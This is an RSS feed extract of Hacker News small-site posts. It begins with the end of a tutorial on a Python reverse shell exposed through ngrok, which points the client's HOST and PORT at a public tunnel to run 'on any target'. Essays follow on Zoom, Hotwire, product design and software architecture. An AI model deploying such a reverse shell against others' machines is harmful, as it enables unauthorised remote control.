<p>ngrok is a reverse proxy that creates a secure tunnel from a public endpoint to
a locally running web service. Simply put, with ngrok you can make any local
service public. And we will make our server public. Go to
<a href="https://ngrok.com/">ngrok</a> sign up and follow the setup tutorial for your
system. For me it's</p>
<blockquote>
<ol>
<li><p>download</p>
<div><pre><span></span>wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
</pre></div>
</li>
<li><p>unzip</p>
<div><pre><span></span>unzip ngrok-stable-linux-amd64.zip
</pre></div>
</li>
<li><p>connect your account</p>
<div><pre><span></span>./ngrok authtoken 1WeW...
</pre></div>
</li>
<li><p>exposed the server</p>

</li>
</ol>
</blockquote>
<p>Now you are ready to run the client on any target, but you have to change the
<em>HOST</em> and <em>PORT</em> to the values from ngrok. For my example that will be</p>
<div><pre><span></span><span>...</span>
<span>HOST</span> <span>=</span> <span>'4.tcp.ngrok.io'</span>
<span>PORT</span> <span>=</span> <span>12050</span>
<span>....</span>
</pre></div>
<p><img alt="alternate text" src="https://axju.de/images/articels/security/reverse-shell-002.png">
</p></div>
<div id="conclusion">
<h2>Conclusion</h2>
<p>As you can see, it's not that complicated to create your own reverse shell and
make it public. I know, there's a lot of space to improve this script. But for a
really Simple example they are quite good enough.</p>
</div>

    </div></div>]]>
            </description>
            <link>https://axju.de/posts/2021/02/a-reverse-shell-with-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26196026</guid>
            <pubDate>Fri, 19 Feb 2021 18:12:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zoom is the solution nobody asked for, to a problem that doesn‚Äôt exist]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26196013">thread link</a>) | @tompccs
<br/>
February 19, 2021 | https://www.vanityfarce.com/office/work/zoom/2021/02/17/zoom.html | <a href="https://web.archive.org/web/*/https://www.vanityfarce.com/office/work/zoom/2021/02/17/zoom.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>Disclaimer ‚Äì This post was poorly researched and most of the historical ‚Äòfacts‚Äô are pieced together from my own recollection, books I‚Äôve been reading and Wikipedia searches. Despite the lack of rigorous scholarship (or perhaps because of it) I expect the conclusion to be 100% correct.</em></p>

<p>When the pandemic is ‚Äúover‚Äù ‚Äì or, more precisely, when the right people decide to declare it ‚Äúover‚Äù and we are living in a world split between Covid-negative and Covid-positive countries with a several year life expectancy gap between them ‚Äì the consensus is that some things will go back to the way they were pre-2020, and others won‚Äôt. Whether or not you think white collar workers will still be working from home ‚Äì living in commuter belts, in or around small towns or in remoter parts of the country side with decent broadband ‚Äì or will have migrated back into the offices, city pubs and crammed trains, depends largely on whether or not you have a financial interest in the value of commercial real estate. One thing everyone seems to agree on, though, is that video conferencing technology, such as Zoom, has been, and will continue to be, central to this revolution in working patterns.</p>

<p>Whatever the future of white collar work holds, I feel I can confidently predict that video conferencing will be not-so-fondly remembered as a weird crutch that everyone was obsessed with for about 12-18 months, before people realised it actually serves no purpose at all.</p>

<p>To argue this point, I will ask the question ‚Äì why do we actually have offices in the first place? Who are they for? What problems do they solve? And which of those problems does video conferencing actually come close to addressing?</p>

<p>The history of bureaucratic white-collar work goes something like this: there are two main threads of office work which emerged around the Industrial Revolution ‚Äì state-administration, and the bourgeoise professions (accountants, lawyers, traders, etc). Of the two threads, state administration is the older: bureaucracies of this sort can be traced back to ancient Egypt. Hierarchies beyond a certain size need paperwork, because the people in charge need a way to have their wishes transmitted authentically without corruption (accidental of nefarious) to hundreds or thousands of  lowly peons. Hence the priestly, and later bureaucratic, class, tasked with the top-down administration of unwieldy empires and later nation-states according to the insights or whims of their rulers.</p>

<p>Obviously, this type of administration pre-dates the ‚Äúoffice‚Äù as we currently recognise it. There aren‚Äôt many western institutions which have been in continuous operation from medieval through to post-industrial times which we can analyse in this way, but one of them might be the British Parliament. Originally an ad-hoc assembly of the King‚Äôs noblemen, gathered as and when the King needed to raise some cash through taxation, this travelling parliament eventually evolved into the more stationary one we know today, where MPs have permanent offices and travel between their constituencies and the debating chambers according to how often they feel the need to escape from those people who elected them there in the first place. In 2021, those MPs are now spending a lot more time in their constituencies. Voting can now happen remotely, although MPs still have the option of attending debates in person. It‚Äôs hard to imagine British government functioning in quite the same way without the cut-and-thrust of rigorous parliamentary debate, but then again, it‚Äôs hard to see how any type of video conferencing solution could recreate it either (just look at what happened in this <a href="https://www.youtube.com/watch?v=jB3P_0GAi0I">disastrous parish council meeting</a>)</p>

<p>What of the rest of the state apparatus? The ambassadors, bureaucrats, etc? Well, to once again take an example from British history, a small cadre of Oxbridge-educated civil servants based in Whitehall, London, used to administer the largest empire in history with no more advanced technology than the telegraph. I can‚Äôt quite imagine a Zoom meeting between Prime Minister Disraeli and the governor-general of India, not to mention with the 120-or-so Indian noblemen scattered about the subcontinent, making this unwieldy task any easier.</p>

<p>So much for administering an empire. What about lower-level state administration ‚Äì things like welfare, sanitation, treasury, etc? You might not be surprised to learn that the primary reason for co-locating lots of bureaucrats is because‚Ä¶<em>that‚Äôs where the filing cabinets were!</em> If you needed to process a tax return, or look up some obscure by-law, you generally had to be co-located with reams and reams of paper containing this information. The fact that this constituted an ‚Äúoffice‚Äù is purely down to the fact that other people needed to be co-located with these files as well as you. The office was originally built for collaboration insofar as a library is built for meeting girls.</p>

<p>We‚Äôve still not explored the other thread of this ‚Äì the thread that runs from Venetian merchants to Google‚Äôs bean-bags and free lunches. This one is harder to explain. As the artisan evolved into the factory worker, so too did the other professionals ‚Äì lawyers, accountants, merchants ‚Äì evolve into the office worker. What was the rationale for this? Why should a lawyer or accountant, each of whom has a few assigned clients, need to work in an office with lots of other lawyers and accountants? Rather than being co-located with their filing cabinets, I suppose the reason is to allow them to share a pool of ancillary staff, like paralegals, typists, etc. However, as the digital revolution has swept through (and, since WWII, rising wages), much of the ancillary staff have been done away with altogether, or else morphed into something called ‚Äòmiddle management‚Äô. The function of middle management, of course, is the same as the ancillary staff: to help the professionals do their jobs better, although by tweaking their job description they were able to negotiate better pay.</p>

<p>If you need ancillary staff (read: middle management), then it stands to reason that you need an office, too. And if you don‚Äôt have an office, then you probably need something that will ‚Äòsimulate‚Äô an office. Here‚Äôs the problem: whereas the ancillary staff of old knew that their job was to type things up, keep appointment diaries and fetch post, middle management believes their job is to hold meetings. Therefore, synonymous with ‚Äòhome working‚Äô is ‚ÄòZoom meetings‚Äô.</p>

<p>I‚Äôve actually omitted a third thread of office history, which is the monastery (or university in 21st century parlance). Why the need to have a bunch of monks living together? In fact, the original Christian monk was a hermit, living in total solitude. But perhaps in not having a family such a degree of loneliness was too much to bear. Hence the monastery, where, as well as (or perhaps in the course of) worshipping God, monks partook in such pastimes as beer brewing, geometry, and science. The fact that big groups of celibate, literate men living in the same place led to all sorts of interesting by-products is perhaps the root of the modern idea of a university, and that legacy also dovetails into our modern corporate culture which has its roots in the 1980s, whose hallmarks are the borrowing of university lingo such as ‚Äòcampus‚Äô, and a growing obsession with a nicely marketable form of self-improvement which can be delivered through highly lucrative training contracts.</p>

<p>There is a fleeting sense in which a modern university, with students living in halls, unemployed and frugal, could look a bit like, if you squint, a short stint at a medieval monastery, and whatever value universities still hold is probably related to how long you can hold onto that mirage. But the modern office, with its 9-to-5 clock and day punctuated by meetings and the ambitious preoccupied by the arduous climb up the corporate hierarchy, is even further away. Perhaps the closest thing to the medieval monastery is the startup, with its ungodly hours and religious-fanatical devotion to the cause, and it‚Äôs probably no coincidence that working in a startup is generally seen as incompatible with having a social or family life. But no, other than the monastic startup-office-cum-bedsit, the office serves no creative purpose. The modern office is little more than a cargo-cult monastery.</p>

<p>Having read and of course also agreed with all of this, one can only wonder what function software such as Zoom can possibly serve. And I think the answer to this is similar to something we often see from new digital technology: the skeuomorphism of existing ‚Äòanalogue‚Äô concepts (ie, the modern ‚Äòdesktop‚Äô containing ‚Äòfiles‚Äô and ‚Äòdocuments‚Äô). Skeuomorphisms are almost always a temporary crutch, a cognitive bridge between the old inefficient way of doing something and the new but conceptually abstract way which will eventually replace it. Consider, for instance, the transition from written letters, to email, to instant messaging. Or how indeed the very idea of an email has become distinct in itself ‚Äì look at how email etiquette has gradually evolved from when you might write one as you would write a letter in the early 2000s to the modern ‚Äúsee attached. cheers, Tom‚Äù. Or look at social media, how Facebook was built on top of your real-world idea of ‚Äòfriends‚Äô by inventing the highly skeuomorphic (and somewhat autistic) concept of ‚Äòfriend requests‚Äô, before Instagram and Twitter developed the more digitally-native concept of ‚Äòfollowing‚Äô.</p>

<p>Zoom is the ‚Äòfriend request‚Äô of the office world. As our work places reverse the 150-year migration from our homes into purpose built offices, recall that that reversal is due to the sudden erosion of the logic which made us move into offices in the first place: record keeping and reference, ancillary staff, and creative collaboration. Zoom and video conferencing is a sticking plaster, and perhaps a desperate plea by the old guard to remind us of how much better ‚Ä¶</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.vanityfarce.com/office/work/zoom/2021/02/17/zoom.html">https://www.vanityfarce.com/office/work/zoom/2021/02/17/zoom.html</a></em></p>]]>
            </description>
            <link>https://www.vanityfarce.com/office/work/zoom/2021/02/17/zoom.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26196013</guid>
            <pubDate>Fri, 19 Feb 2021 18:10:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Hotwire Could be the Future of Front-end Dev]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26195969">thread link</a>) | @timdl
<br/>
February 19, 2021 | https://wizville.fr/en/blog/a-product-guys-take-on-hotwire-vs-vue-react/ | <a href="https://web.archive.org/web/*/https://wizville.fr/en/blog/a-product-guys-take-on-hotwire-vs-vue-react/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
							<p><span>I‚Äôve had the chance of talking directly to <a href="https://twitter.com/dhh" target="_blank" rel="noopener">@DHH</a>&nbsp;himself, creator of Ruby on Rails, on the 28th of January, mostly about Hotwire (video at the end of the post). Just writing this, as a product guy who never shipped a line of Ruby in production, still feels completely crazy.&nbsp;</span></p>
<h2><b>How it happened</b></h2>
<p><span>It all started as a joke. At <a href="https://wizville.fr/en/" target="_blank" rel="noopener">WizVille</a>, like most startups, we struggle to hire Fullstack Rails developers that match our (rather high) expectations. Which is a problem when your whole strategy is based on changing the way your customers go about their business through technology and innovation. Especially when you feel like you‚Äôve&nbsp;<a href="https://techcrunch.com/2020/10/15/wizville-local-monitor-helps-small-shops-track-google-maps-ratings-of-competitors/" target="_blank" rel="noopener">cracked it</a> and start having stronger traction than ever, both nationally and internationally, and have had <strong>3 senior Software Engineers positions open for 4 months (see our&nbsp;<a href="https://www.welcometothejungle.com/fr/companies/wizville/jobs/ruby-on-rails-developer-experimente-e-h-f-x_paris">remaining open position</a>)</strong>‚Ä¶&nbsp;</span></p>
<p><span>So one night, I call Cl√©ment, our CTO, and tell him : ¬´ Let‚Äôs ask DHH to come talk at our first ever WizVille-hosted tech event!¬ª. The idea would be to make a powerful statement to the Rails community in France: ¬´ WizVille means business, and takes inspiration from the best, you should join us! ¬ª.</span></p>
<p><span>Cl√©ment laughed and answered, ¬´ well, that‚Äôs a crazy idea, but he just launched Hotwire and a new version of Turbo today ¬ª. I open Hacker News, ¬´ <a href="https://hotwire.dev/" target="_blank" rel="noopener">Hotwire: HMTL over the wire</a> ¬ª is the #1 post. I find out about the tech and realize that not only Hotwire is a potential game changer, but also that this is the perfect opportunity.&nbsp;</span></p>
<p><span>It just took one email, I offered to gather as much of the French Rails community as possible for an event during which he could spread the word about Hotwire, and he accepted within 24 hours. I think he did because the email transpired the fact that I was maybe the most determined guy out there to be willing to gather as much of the Rails community for a dedicated event about HW.&nbsp;</span></p>
<h2><b>Not just another front-end framework</b></h2>
<p><span>At first, I thought Hotwire wasn‚Äôt meant to take over the front-end development game in David‚Äôs mind. But <strong>I was shocked by his answers and the displayed pureness of his ambition</strong> on why he created it and shipped HW for the world to use.&nbsp;</span></p>
<p><span>We all know David for his game changing vision with Rails, and his radical approach to working described in Rework and how it influenced the way the tech world sees work. But Rails was launched at a different time, when you‚Äôd think the competing technologies were ‚Äúrather clearly‚Äù retrograde.&nbsp;</span></p>
<p><span>We also know how powerful frameworks like Vue and React are today. </span> <span>So, assuming the potential limitations of Hotwire, since it‚Äôs HTML-based, and the incredible contenders there are in the front-end development world (lead by the likes of Facebook, Google‚Ä¶), I never thought David was going to pitch us an upcoming shift in the way apps are created‚Ä¶ even though it kinda feels obvious now that he‚Äôs described it to me.&nbsp;</span></p>
<h2><b>Why Hotwire could be the future&nbsp;</b></h2>
<ol>
<li aria-level="1"><span>You can learn Hotwire over a week-end according to David. On average it takes about a month or two with React. With V ue, about 2 to 4 weeks.&nbsp;</span></li>
<li aria-level="1"><b>Having to code everything in Javascript on the front-end has never been a free choice</b><span>: it‚Äôs always been a choice made out of the absence of alternatives. With HW, app builders won‚Äôt have to deal with the complexities of having developers specialized in a completely different technology. And will use the needed technology for the appropriate goal. That will dramatically increase the developer‚Äôs satisfaction since he will be able to use his preferred language and also manage most of the spectrum of web app building himself.&nbsp;</span></li>
<li aria-level="1"><span>Hotwire is an independent project from Rails, which means it works with any back end development framework.&nbsp;</span></li>
<li aria-level="1"><span>Hotwire also works on mobile. Out of Hey‚Äôs mobile app‚Äôs +100 screens, only one of them is built in native languages. There‚Äôs also a misconception about Strada (not released at the moment I‚Äôm writing this): it will just give developers a more conventionalized approach for interacting with their native apps, but that‚Äôs it.&nbsp;</span></li>
<li aria-level="1"><span>Hotwire works for every kind of app, save for apps that really require javascript‚Äôs abilities as a technology, and need to work independently in the client (calendars or apps like Figma). That kind of app is a very small fraction, and Hotwire can be combined with a JS framework like React or Vue if needed.&nbsp;</span></li>
</ol>
<p><b>So there you have all the ingredients to replace any front-end framework:</b></p>
<ul>
<li aria-level="1"><span>Speed: get your developers up to speed on your front-end framework faster, and therefore potentially ship your product faster</span></li>
<li aria-level="1"><span>Simplicity: easier for back-end developers to do otherwise complex front-end work</span></li>
<li aria-level="1"><span>Coherent technology choice : use complex front-end frameworks only when needed for some features</span></li>
<li aria-level="1"><span>Compatibility : works with all back-end frameworks and all types of web apps</span></li>
</ul>
<h2><b>Main concerns to date&nbsp;</b></h2>
<p><span>The main concerns are mostly related to <strong>how little time it‚Äôs been since Hotwire has been released</strong>. This means smaller community and stack overflow threads, and also fewer plugins. The most advanced design framework you could use is <a href="https://tailwindcss.com/" target="_blank" rel="noopener">Tailwind</a>, a CSS framework. Which may have us coding our own animations or having to combine with other libraries‚Ä¶? </span><span>Also, having to combine front-end frameworks in some cases, doesn‚Äôt feel ideal.</span></p>
<p><span>David told us that Hotwire was up to a much stronger start than Rails, so we could expect to have most of those concerns solved along the road.&nbsp;</span></p>
<p><b>But the mere fact that David Heinemier Hansson deeply believes that his personal mission is to liberate developers from the grip of Single-Page-Apps with Hotwire should definitely have everyone‚Äôs attention in Tech. And it definitely has ours at WizVille.&nbsp;</b></p>
<h2><b>About the event&nbsp;</b></h2>
<p><span>The event was called ¬´ Hotwire &amp; Startups: Dreaming bigger With Rails in 2021 ¬ª and you can enjoy David‚Äôs 1 hour fireside chat mainly about Hotwire below:&nbsp;</span></p>
<p><iframe width="669" height="376" src="https://www.youtube.com/embed/GtWc-xo9ZBo?start=4347&amp;feature=oembed&amp;enablejsapi=1&amp;origin=https://wizville.fr" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>We also asked their opinions about Hotwire to <a href="https://twitter.com/sylvainutard?lang=fr">Sylvain Utard</a> (AI General Manager @&nbsp;<a href="http://algolia.com/">Algolia</a>), and Nicolas Denayer (VP Engineering @&nbsp;<a href="http://doctolib.com/">Doctolib</a>) along with our own CTO, <a href="https://www.linkedin.com/in/clement-bruchon-37319545/?originalSubdomain=fr">Cl√©ment Bruchon</a>, see the video of the panel here (in French):</p>
<p><iframe width="669" height="376" src="https://www.youtube.com/embed/GtWc-xo9ZBo?start=296&amp;feature=oembed&amp;enablejsapi=1&amp;origin=https://wizville.fr" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p><span>We plan on hosting a 2022 edition of a similar event and are sure to have even more to say on the matter of Hotwire vs React &amp; Vue.&nbsp;</span></p>
<h2><strong>About the author&nbsp;</strong></h2>
<p><a href="http://twitter.com/timdl">Timoth√©e de Laitre</a>&nbsp;is CEO &amp; Head of Product @ <a href="http://wizville.fr/en">WizVille</a>, a 30 people SaaS startup developing a Customer Feedback Platform dedicated to Retail Chains. See our currently open positions <a href="https://www.welcometothejungle.co/companies/wizville/jobs" target="_blank" rel="noopener">here.</a></p>

							</div></div>]]>
            </description>
            <link>https://wizville.fr/en/blog/a-product-guys-take-on-hotwire-vs-vue-react/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26195969</guid>
            <pubDate>Fri, 19 Feb 2021 18:07:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Build Great Products]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26195921">thread link</a>) | @awaxman11
<br/>
February 19, 2021 | https://blog.awaxman.com/how-to-build-great-products | <a href="https://web.archive.org/web/*/https://blog.awaxman.com/how-to-build-great-products">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2 id="build-at-the-intersection">Build at the intersection</h2><p>The best products are created at the intersection of product, design, and engineering. Successful teams start, build, and finish together. Fewer handoffs, and more multidisciplinary debates and considerations. </p><p><span>
      <span></span>
  <picture>
        <source srcset="https://blog.awaxman.com/static/1112b437f77f3dd31536291f1cece44c/68fc1/x-functional-overlap.webp 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/webp">
        <source srcset="https://blog.awaxman.com/static/1112b437f77f3dd31536291f1cece44c/6ca50/x-functional-overlap.png 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/png">
        <img tabindex="0" src="https://blog.awaxman.com/static/1112b437f77f3dd31536291f1cece44c/6ca50/x-functional-overlap.png" alt="Cross Functional Overlap" title="Cross Functional Overlap" loading="lazy">
      </picture>
    </span></p><h2 id="decide-at-the-intersection">Decide at the intersection</h2><p>The best product decisions are made at the intersection of data, empathy, and instincts. Using a variety of inputs helps balance the strengths and weaknesses of these approaches. </p><p><span>
      <span></span>
  <picture>
        <source srcset="https://blog.awaxman.com/static/93081d76efe6dfc9922bcbbf980ed3d0/68fc1/decision-making.webp 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/webp">
        <source srcset="https://blog.awaxman.com/static/93081d76efe6dfc9922bcbbf980ed3d0/6ca50/decision-making.png 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/png">
        <img tabindex="0" src="https://blog.awaxman.com/static/93081d76efe6dfc9922bcbbf980ed3d0/6ca50/decision-making.png" alt="Decision Making" title="Decision Making" loading="lazy">
      </picture>
    </span></p><h2 id="embrace-healthy-tension">Embrace healthy tension</h2><p>There should be healthy tension between product, engineering, and design. Each team brings unique perspectives and will create a checks and balance system that ensures the end result is viable, desirable, and feasible. </p><p><span>
      <span></span>
  <picture>
        <source srcset="https://blog.awaxman.com/static/48102c8d2333d438060e1a13b23d950a/68fc1/healthy-tension.webp 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/webp">
        <source srcset="https://blog.awaxman.com/static/48102c8d2333d438060e1a13b23d950a/6ca50/healthy-tension.png 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/png">
        <img tabindex="0" src="https://blog.awaxman.com/static/48102c8d2333d438060e1a13b23d950a/6ca50/healthy-tension.png" alt="Healthy Tension" title="Healthy Tension" loading="lazy">
      </picture>
    </span></p><h2 id="be-data-informed-not-driven">Be data informed, not driven</h2><p>Measure what you can, but recognize the limitations of data and that many important things cannot be measured. If you‚Äôre interested in this topic check out my <a href="https://blog.awaxman.com/beware-the-cult-of-numeracy" target="_blank" rel="noreferrer">related post</a>.</p><p><span>
      <span></span>
  <picture>
        <source srcset="https://blog.awaxman.com/static/1e8df4f4639fbbc2ae178203c6bf19a9/68fc1/data-informed.webp 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/webp">
        <source srcset="https://blog.awaxman.com/static/1e8df4f4639fbbc2ae178203c6bf19a9/6ca50/data-informed.png 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/png">
        <img tabindex="0" src="https://blog.awaxman.com/static/1e8df4f4639fbbc2ae178203c6bf19a9/6ca50/data-informed.png" alt="Data informed" title="Data informed" loading="lazy">
      </picture>
    </span></p><h2 id="make-time-horizon-appropriate-goals">Make time horizon appropriate goals</h2><p>Orient short term goals around inputs, medium term goals around outputs, and long term goals around outcomes. Make sure they all connect. Deciding appropriate goals and time horizons depends on the maturity of the product (new vs existing), the type of behavior you‚Äôre hoping to drive near term (engagement, transactions), and the type of behavior you‚Äôre hoping to drive long term (loyalty, retention). The devil is in the details.</p><p><span>
      <span></span>
  <picture>
        <source srcset="https://blog.awaxman.com/static/8652bb2dbf003390fb6e6c0fdf7e4563/68fc1/time-horizons.webp 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/webp">
        <source srcset="https://blog.awaxman.com/static/8652bb2dbf003390fb6e6c0fdf7e4563/6ca50/time-horizons.png 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/png">
        <img tabindex="0" src="https://blog.awaxman.com/static/8652bb2dbf003390fb6e6c0fdf7e4563/6ca50/time-horizons.png" alt="Time horizons" title="Time horizons" loading="lazy">
      </picture>
    </span></p><h2 id="zoom-out-to-recognize-true-tradeoffs">Zoom out to recognize true tradeoffs</h2><p>Short term vs long term business value is a more appropriate and useful framing for many business vs user tradeoff discussions. Focusing on consistently delivering value will create more long term value than using dark patterns to boost near term conversion rates.</p><p><span>
      <span></span>
  <picture>
        <source srcset="https://blog.awaxman.com/static/8433f1e42308749671461af09fa3a88d/68fc1/tradeoffs.webp 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/webp">
        <source srcset="https://blog.awaxman.com/static/8433f1e42308749671461af09fa3a88d/6ca50/tradeoffs.png 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/png">
        <img tabindex="0" src="https://blog.awaxman.com/static/8433f1e42308749671461af09fa3a88d/6ca50/tradeoffs.png" alt="Tradeoffs" title="Tradeoffs" loading="lazy">
      </picture>
    </span></p><h2 id="think-big-start-small">Think big, start small</h2><p>Break down large ideas into iterative experiments that stand on their own but build towards a long term goal. Learn more from the guy who popularized this <a href="https://blog.crisp.se/2016/01/25/henrikkniberg/making-sense-of-mvp" target="_blank" rel="noreferrer">here</a>.</p><p><span>
      <span></span>
  <picture>
        <source srcset="https://blog.awaxman.com/static/dc8e5816be07cfc5528c891db0b7acdd/68fc1/iterative-development.webp 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/webp">
        <source srcset="https://blog.awaxman.com/static/dc8e5816be07cfc5528c891db0b7acdd/6ca50/iterative-development.png 1200w" sizes="(max-width: 1200px) 100vw, 1200px" type="image/png">
        <img tabindex="0" src="https://blog.awaxman.com/static/dc8e5816be07cfc5528c891db0b7acdd/6ca50/iterative-development.png" alt="Iterative Development" title="Iterative Development" loading="lazy">
      </picture>
    </span></p><p>What heuristics do you use to build great products?</p></div></div>]]>
            </description>
            <link>https://blog.awaxman.com/how-to-build-great-products</link>
            <guid isPermaLink="false">hacker-news-small-sites-26195921</guid>
            <pubDate>Fri, 19 Feb 2021 18:04:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unarchitecture]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26195823">thread link</a>) | @todsacerdoti
<br/>
February 19, 2021 | https://skepticalhippo.io/post/the-unarchitecture | <a href="https://web.archive.org/web/*/https://skepticalhippo.io/post/the-unarchitecture">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>A team of developers have been given a new greenfield project to deliver. The powers that be told them they have full control over the technical direction of the project. The team was excited to move on from their legacy project, it was a great opportunity for them to apply the lessons from the old onto the new. They were going to <em>do things properly</em> this time.</p><h2 id="building-a-barn-with-a-golden-hammer">Building a Barn With a Golden Hammer</h2><p>One of the developers closely follows the <a href="https://eng.uber.com/" target="_blank" rel="nofollow noopener noreferrer">Uber Engineering Blog</a> and there she read Uber uses Golang to hit stellar RPS (requests per second) numbers. She proposed that the team writes this project in Golang so they can leverage that same performance.</p><p>The second developer suggested they use React for the frontend and build an SPA (single page application), because that's what everyone's doing these days and it's the de facto standard.</p><p>The last developer found great success with serverless microservices at his previous company. He recommended they leverage the near infinite scalability of the serverless platform for their new project.</p><p>At face value, the plan seemed solid - Golang on the backend, a React SPA on the frontend and it's all going to be served by a serverless microservice infrastructure. It was going to be performant, infinitely scalable and decoupled.</p><p>Executing the plan proved more difficult than they anticipated. It turns out they forgot to take a few things into account.</p><p>The team didn't have any real experience with Golang as they were all primarily PHP developers. Building a React SPA was proving to be a time sink as they now had an additional problem of communicating with APIs. By the time they had 12 microservices, the complexity of their system was causing more issues than it was solving. To add insult to injury, they were only asked to build a very basic inventory management system for internal use.</p><p>Somewhere in the excitement and the prospect of doing it like the big companies the team forgot where they were, what worked for them and what they were building. What they thought they had was a solid architectural foundation to build upon, but what they ended up with was an <em>unarchitecture</em>.</p><h2 id="what-exactly-is-unarchitecture">What Exactly is Unarchitecture?</h2><p>I actually borrowed the idea for the word from <a href="https://unarchitecture.wordpress.com/about/" target="_blank" rel="nofollow noopener noreferrer">this blog</a> and think it encompasses what I'm trying to convey here. To me, unarchitecture is ill-fitting software architecture, which is often born of best intentions.</p><p>If good software architecture makes a codebase easy and enjoyable to work with, then unarchitecture is the antithesis of that. An unarchitected codebase is a source of endless friction and misery for developers, it makes new features tiresome to develop and fixing bugs a soul-crushing exercise.</p><h2 id="where-and-how-does-it-happen">Where and How Does it Happen?</h2><p>The story in the introduction has a series of questionable decisions that led to unarchitecting the codebase, but in reality all it takes is just one decision to create a pocket of friction in any codebase. For example, you could just over-engineer the CI pipeline and make nobody on your team want to touch it with a 10 foot pole.</p><p>I've found that unarchitecture often comes from a good place. We often tend to apply what we already know as working without really weighing up the pros and cons (everything has cons) of the approaches within our current context. What worked for a company with a team of 20 might not necessarily work for a team of 3. This applies across the board to software packages, languages, libraries, frameworks and patterns.</p><p>I like to think it's akin to wearing your parents shoes when you're 7. You've seen your parents walk in them and you really want to be like the grown ups, but once you try them on you can barely walk in them, much less run.</p><h2 id="preventing-unarchitecture">Preventing Unarchitecture</h2><p>I think there are a few ways we can try and prevent ourselves from unarchitecting our applications:</p><ul><li>We should aim to try and keep things as simple as possible for as long as possible. Introduce complexity only when we really need it.</li><li>Put our ego aside and question whether the pattern or technology we're applying is right for us, within our current context. Some questions that I like to ask myself are:<ul><li>Will my team realistically be able to maintain this? Do we have the skills required currently, can we learn or grow the team to accommodate for what we're trying to achieve?</li><li>Can it stifle future growth? If we're going for simplicity, will it be hard to evolve if we need to?</li><li>If our decision turns out being a mistake, how hard will it be to take a step back and go on a different path?</li><li>Is this something that will bring us value? How? Maybe our efforts are better focused elsewhere?</li></ul></li><li>I'm a big believer in <a href="https://www.thoughtworks.com/insights/blog/applying-conways-law-improve-your-software-development" target="_blank" rel="nofollow noopener noreferrer">Conway's Law</a> and think we should take into account the structure of the organisation when we're architecting our applications. Our architecture should either complement the structure or drive change in the direction that we want to go.</li></ul><h2 id="closing-note">Closing Note</h2><p>In a world where microservices, serverless, Leviathan-esque container orchestration tools and decoupled frontends are all the rage, it's easy to lose sight of where we are and what we're trying to achieve and give in to hype driven development instead.</p><p>I think, in general, we should just strive to approach software architecture with more pragmatism and not give in to dogma. After all, there's no such thing as a panacea.</p></div></div>]]>
            </description>
            <link>https://skepticalhippo.io/post/the-unarchitecture</link>
            <guid isPermaLink="false">hacker-news-small-sites-26195823</guid>
            <pubDate>Fri, 19 Feb 2021 17:56:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Some practical software engineering guidelines]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26195295">thread link</a>) | @jd115
<br/>
February 19, 2021 | https://corebrief.com/2021/02/19/some-practical-software-engineering-guidelines/ | <a href="https://web.archive.org/web/*/https://corebrief.com/2021/02/19/some-practical-software-engineering-guidelines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-308">

    

	<div>

		
<blockquote><p>Cruft (<em>noun</em>) [INFORMAL | COMPUTING] : badly designed, unnecessarily complicated, or unwanted code or software.</p></blockquote>



<h2>First and foremost, keep things simple‚Ä¶</h2>



<p>As much as possible, keep everything smaller. Smaller projects are better. Smaller packages are better. Smaller interfaces are better. Smaller classes are better. Smaller functions / methods are better. Smaller tests are better.</p>



<p>Make sure any developer on the team (or a new joiner) can encompass the entirety of your ‚Äúunit‚Äù in their mind. This reduces <a href="https://en.wikipedia.org/wiki/Accidental_complexity" target="_blank" rel="noreferrer noopener">accidental complexity</a> and makes everything else easier.</p>



<p>When working with existing code which is intimidating, try to think of ways to break it down into smaller pieces and to simplify. Think of ways to reduce it. Deleting code (when done with care) can be as valuable as writing new code.</p>



<p>In particular, strive to keep functions concise. Bigger functions create bigger problems and are more difficult to test.</p>



<h2>begin by simplifying the logic</h2>



